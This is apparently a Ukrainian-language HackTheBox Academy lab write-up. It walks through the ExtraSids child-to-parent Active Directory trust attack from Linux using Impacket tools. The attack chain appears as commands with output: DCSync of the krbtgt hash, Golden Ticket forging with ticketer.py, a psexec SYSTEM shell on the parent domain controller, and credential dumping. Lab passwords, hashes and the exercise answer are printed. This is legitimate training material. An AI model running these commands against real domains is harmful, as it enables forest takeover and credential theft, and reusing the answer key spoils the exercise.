# Attacking Domain Trusts — Child → Parent (ExtraSids, Linux)

## ℹ️ Інформація

| Поле        | Значення |
| ----------- | -------- |
| 🌐 Platform | HackTheBox Academy |
| 📚 Module   | Active Directory Enumeration & Attacks |
| 🔗 Section  | Attacking Domain Trusts - Child -> Parent Trusts - from Linux |
| 🧩 Hosts    | ACADEMY-EA-ATTACK01 (10.129.26.83), ACADEMY-EA-DC02 (10.129.180.47) |

***

## 🔑 Теорія (коротко)

Маючи повний контроль над дочірнім доменом `LOGISTICS.INLANEFREIGHT.LOCAL`, ми можемо використати **DCSync** для отримання `krbtgt` NTLM‑хеша child‑домену.  
Далі, використовуючи цей хеш, утиліта `ticketer.py` дозволяє створити **Golden Ticket** для вигаданого користувача, у PAC якого через **ExtraSids** додаємо SID групи `Enterprise Admins` root‑домену `INLANEFREIGHT.LOCAL`.  
З таким квитком ми автентифікуємось до сервісів у parent‑домені (наприклад, до `ACADEMY-EA-DC01`) та діємо як Enterprise Admin, у тому числі можемо DCSync‑ити або дампити NTDS, щоб отримати NTLM‑хеши користувачів (у нашому випадку — `bross`).

***

## 🧪 Практика — ExtraSids з Linux (ручний шлях)

### Q1 — NTLM hash для Domain Admin user `bross`

**Формулювання:**  
Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.

Кінцева відповідь (з твоєї сесії):  

```text
49a074a39dd0651f647e765c2cc794c7
Нижче — повний шлях отримання цього хеша.

1. Вихідні умови (SSH‑доступ)
Підключаємося до Linux‑атакаючого хоста і child DC.[page:0]

bash
ssh htb-student@10.129.26.83
# пароль: HTB_@cademy_stdnt!

ssh htb-student@10.129.180.47
# той самий пароль при необхідності
Усі наступні кроки виконуємо з ACADEMY-EA-ATTACK01.

2. Отримуємо KRBTGT NTLM child‑домену (DCSync з Linux)
Мета: дістати NTLM‑хеш LOGISTICS\krbtgt, щоб потім створити Golden Ticket.[web:25]

bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@10.129.180.47 -just-dc-user LOGISTICS/krbtgt
Password: HTB_@cademy_stdnt_admin!
Фрагмент реального виводу:

text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
...
Звідси беремо:

LMHASH (ігноруємо): aad3b435b51404eeaad3b435b51404ee

NTLM (NTHASH): 9d765b482771505cbe97411065964d5f

Цей хеш використаємо в ticketer.py.

3. Отримуємо SID child‑домену LOGISTICS
Мета: дізнатись SID домену LOGISTICS.INLANEFREIGHT.LOCAL для параметра -domain-sid у ticketer.py.[web:25]

bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@10.129.180.47 | grep "Domain SID"
Password: HTB_@cademy_stdnt_admin!
Реальний вивід:

text
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
SID child‑домену:
S-1-5-21-2806153819-209893948-922872689

4. Отримуємо SID Enterprise Admins у root‑домені
Мета: знайти SID групи INLANEFREIGHT\Enterprise Admins, яку додамо як ExtraSid.[web:25]

Тепер таргетуємо root DC (DC01, 172.16.5.5):

bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5
Password: HTB_@cademy_stdnt_admin!
Щоб не гортати весь список, фільтруємо:

bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B5 "Enterprise Admins"
Вивід:

text
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
З теорії/Windows‑секції знаємо Domain SID root‑домену:

S-1-5-21-3842939050-3880317879-2865463114

Додаємо RID 519:

SID Enterprise Admins:
S-1-5-21-3842939050-3880317879-2865463114-519

5. Створюємо Golden Ticket з ExtraSids (ticketer.py)
Мета: створити Golden Ticket для користувача hacker у child‑домені, додавши ExtraSid Enterprise Admins root‑домену.[web:25]

Потрібні параметри:

-nthash → NTLM KRBTGT child: 9d765b482771505cbe97411065964d5f

-domain → LOGISTICS.INLANEFREIGHT.LOCAL

-domain-sid → S-1-5-21-2806153819-209893948-922872689

-extra-sid → S-1-5-21-3842939050-3880317879-2865463114-519

user → hacker (необов’язково існуючий).

Команда:

bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
Вивід:

text
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
...
[*] Saving ticket in hacker.ccache
У каталозі з’являється файл hacker.ccache.

6. Вказуємо системі використовувати hacker.ccache
Мета: налаштувати використання створеного Kerberos‑квитка для подальших інструментів Impacket.[web:25]

bash
export KRB5CCNAME=hacker.ccache
ls -l hacker.ccache
Якщо файл в іншому каталозі — вкажи повний шлях:

bash
export KRB5CCNAME=/home/htb-student/hacker.ccache
7. Перевіряємо доступ до parent DC через psexec.py
Мета: переконатися, що Golden Ticket з ExtraSids дає нам SYSTEM на ACADEMY-EA-DC01.[web:25]

bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
Успішний вивід всередині psexec‑шеллу:

text
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
ACADEMY-EA-DC01
Це означає, що ExtraSids‑квиток надає нам SYSTEM/Enterprise Admin доступ на DC01.

8. Альтернатива / автоматизація: raiseChild.py
Мета: автоматизувати підняття child → parent (ExtraSids, KRBTGT, Enterprise Admins SID + psexec) і отримати креди forest’у.[web:25]

З ATTACK01:

bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
Password: HTB_@cademy_stdnt_admin!
Фрагмент твого реального виводу:

text
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCOL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:...:9d765b482771505cbe97411065964d5f:::
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:...:16e26ba33e455a8c338142af8d89ffbc:::
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3...:88ad09182de639ccc6579eb0849751cf:::
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
Microsoft Windows [Version 10.0.17763.107]
...
raiseChild.py автоматично:

знаходить Enterprise Admins SID

робить DCSync для KRBTGT

створює Golden Ticket

запускає psexec на DC01 як SYSTEM.

Ми використали його додатково, але основну логіку ExtraSids уже реалізували вручну.

9. Отримуємо NTLM‑хеш bross (кінцева відповідь)
Після компрометації parent‑домену нам потрібно отримати NTLM‑хеш доменного користувача bross.[file:29]

Варіант з Kerberos‑квитком hacker (як у шпаргалці):
bash
secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 | grep "bross"
Реальний фрагмент з твого paste.txt:

text
inlanefreight.local\bross:1106:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
[file:29]

Формат: domain\user:RID:LMHASH:NTHASH:::

Отже:

LMHASH: aad3b435b51404eeaad3b435b51404ee

NTLM (NTHASH): 49a074a39dd0651f647e765c2cc794c7

✅ Відповідь для питання секції (NTLM hash для Domain Admin user bross):

text
49a074a39dd0651f647e765c2cc794c7
Короткий підсумок логіки
Через secretsdump.py (DCSync) отримали NTLM‑хеш KRBTGT дочірнього домену.

Через lookupsid.py знайшли SID child‑домену та SID групи Enterprise Admins root‑домену.

За допомогою ticketer.py створили Golden Ticket для користувача hacker у child‑домені з ExtraSid Enterprise Admins root‑домену.

Налаштували KRB5CCNAME на hacker.ccache й зайшли на ACADEMY-EA-DC01 як SYSTEM через psexec.py -k -no-pass.

Використали secretsdump.py ... | grep "bross" проти DC01, щоб отримати NTLM‑хеш доменного адміністратора bross — 49a074a39dd0651f647e765c2cc794c7.
